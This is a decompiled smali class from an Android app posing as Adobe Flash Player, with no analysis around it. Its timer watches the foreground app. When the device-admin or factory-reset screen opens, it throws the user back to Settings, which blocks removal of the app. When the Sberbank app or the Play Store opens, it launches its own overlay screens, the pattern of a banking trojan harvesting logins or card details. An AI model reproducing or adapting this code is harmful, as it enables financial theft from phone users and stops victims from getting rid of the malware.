.class Lcom/adobe/flashplayer_/AZC$1;
.super Landroid/os/CountDownTimer;
.source "AZC.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/flashplayer_/AZC;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/flashplayer_/AZC;


# direct methods
.method constructor <init>(Lcom/adobe/flashplayer_/AZC;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    .line 42
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 1

    .prologue
    .line 106
    iget-object v0, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v0}, Lcom/adobe/flashplayer_/AZC;->stopSelf()V

    .line 107
    return-void
.end method

.method public onTick(J)V
    .locals 11
    .param p1, "millisUntilFinished"    # J

    .prologue
    const/high16 v7, 0x100000

    const/high16 v10, 0x40000000    # 2.0f

    const/high16 v9, 0x10000000

    const/high16 v8, 0x4000000

    .line 48
    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    const-string v6, "activity"

    invoke-virtual {v5, v6}, Lcom/adobe/flashplayer_/AZC;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 49
    .local v0, "am":Landroid/app/ActivityManager;
    const/4 v5, 0x1

    invoke-virtual {v0, v5}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v4

    .line 50
    .local v4, "taskInfo":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const/4 v5, 0x0

    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v5, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 54
    .local v1, "ci":Landroid/content/ComponentName;
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v5

    const-string v6, "com.android.settings.DeviceAdminAdd"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_0

    .line 55
    const/4 v2, 0x1

    .line 56
    .local v2, "ff":Z
    new-instance v3, Landroid/content/Intent;

    const-string v5, "android.settings.SETTINGS"

    invoke-direct {v3, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 57
    .local v3, "intent":Landroid/content/Intent;
    invoke-virtual {v3, v7}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 58
    invoke-virtual {v3, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 59
    invoke-virtual {v3, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 60
    invoke-virtual {v3, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 61
    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5, v3}, Lcom/adobe/flashplayer_/AZC;->startActivity(Landroid/content/Intent;)V

    .line 66
    .end local v2    # "ff":Z
    .end local v3    # "intent":Landroid/content/Intent;
    :cond_0
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v5

    const-string v6, "com.android.settings.MasterReset"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 67
    new-instance v3, Landroid/content/Intent;

    const-string v5, "android.settings.SETTINGS"

    invoke-direct {v3, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 68
    .restart local v3    # "intent":Landroid/content/Intent;
    invoke-virtual {v3, v7}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 69
    invoke-virtual {v3, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 70
    invoke-virtual {v3, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 71
    invoke-virtual {v3, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 72
    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5, v3}, Lcom/adobe/flashplayer_/AZC;->startActivity(Landroid/content/Intent;)V

    .line 77
    .end local v3    # "intent":Landroid/content/Intent;
    :cond_1
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v5

    const-string v6, "ru.sberbankmobile"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_2

    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    const-string v6, "FkData"

    iget-object v7, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v7}, Lcom/adobe/flashplayer_/AZC;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v5, v6, v7}, Lcom/adobe/flashplayer_/AZC;->access$0(Lcom/adobe/flashplayer_/AZC;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    const-string v6, ""

    if-ne v5, v6, :cond_2

    .line 78
    const/4 v2, 0x1

    .line 79
    .restart local v2    # "ff":Z
    new-instance v3, Landroid/content/Intent;

    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5}, Lcom/adobe/flashplayer_/AZC;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    const-class v6, Lcom/adobe/packages/SB;

    invoke-direct {v3, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 80
    .restart local v3    # "intent":Landroid/content/Intent;
    const-string v5, "android.intent.action.VIEW"

    invoke-virtual {v3, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 81
    invoke-virtual {v3, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 82
    invoke-virtual {v3, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 83
    invoke-virtual {v3, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 84
    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5, v3}, Lcom/adobe/flashplayer_/AZC;->startActivity(Landroid/content/Intent;)V

    .line 89
    .end local v2    # "ff":Z
    .end local v3    # "intent":Landroid/content/Intent;
    :cond_2
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v5

    const-string v6, "com.android.vending.AssetBrowserActivity"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_3

    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    const-string v6, "pmfkz"

    iget-object v7, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v7}, Lcom/adobe/flashplayer_/AZC;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v5, v6, v7}, Lcom/adobe/flashplayer_/AZC;->access$0(Lcom/adobe/flashplayer_/AZC;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    const-string v6, ""

    if-ne v5, v6, :cond_3

    .line 90
    const/4 v2, 0x1

    .line 91
    .restart local v2    # "ff":Z
    new-instance v3, Landroid/content/Intent;

    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5}, Lcom/adobe/flashplayer_/AZC;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    const-class v6, Lcom/adobe/packages/PM;

    invoke-direct {v3, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 92
    .restart local v3    # "intent":Landroid/content/Intent;
    const-string v5, "android.intent.action.VIEW"

    invoke-virtual {v3, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 93
    invoke-virtual {v3, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 94
    invoke-virtual {v3, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 95
    invoke-virtual {v3, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 96
    iget-object v5, p0, Lcom/adobe/flashplayer_/AZC$1;->this$0:Lcom/adobe/flashplayer_/AZC;

    invoke-virtual {v5, v3}, Lcom/adobe/flashplayer_/AZC;->startActivity(Landroid/content/Intent;)V

    .line 103
    .end local v2    # "ff":Z
    .end local v3    # "intent":Landroid/content/Intent;
    :cond_3
    return-void
.end method
